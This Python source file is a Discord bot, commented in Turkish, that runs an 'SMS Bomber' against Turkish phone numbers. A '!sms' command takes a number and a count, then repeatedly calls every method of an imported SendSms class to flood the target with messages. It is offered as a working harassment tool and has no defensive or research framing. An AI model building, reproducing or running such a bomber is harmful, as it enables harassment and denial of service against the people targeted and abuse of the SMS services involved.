import discord
from time import sleep
from sms import SendSms

TOKEN = "x"

gif = "https://media.tenor.com/SWiGXYOM8eMAAAAC/russia-soviet.gif"
saniye = 0
stop_sms = False  # SMS göndermeyi durdurmak için global bir değişken

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name="BOMBA ATAR 7/24 SAPLAR")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    global stop_sms  # Global değişkeni tanımla
    
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 3 and message.content.split(" ")[0] == "!sms":
        telno = message.content.split(" ")[1]
        adet = int(message.content.split(" ")[2])  # adet'i bir tamsayıya dönüştür
        if len(telno) == 10:
            embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff)
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet and not stop_sms:  # Botun SMS göndermeyi durdurmasını kontrol et
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet or stop_sms:  # Botun SMS göndermeyi durdurmasını sağla
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")                        
        else:
            await message.channel.send(f"Geçerli komut yazınız!\nYardım için '!help' yazınız.\n{message.author.mention}")
    elif "!help" == message.content.lower():
        await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```!sms 5051234567 10```\n!sms (telefon numarası) (adet)\n{message.author.mention}")
    elif "!stop" == message.content.lower():
        await message.channel.send("SMS gönderme işlemi durduruldu.")
        stop_sms = True  # SMS göndermeyi durdurmak için stop_sms'yi True yap
    else:
        pass
  
client.run(TOKEN)
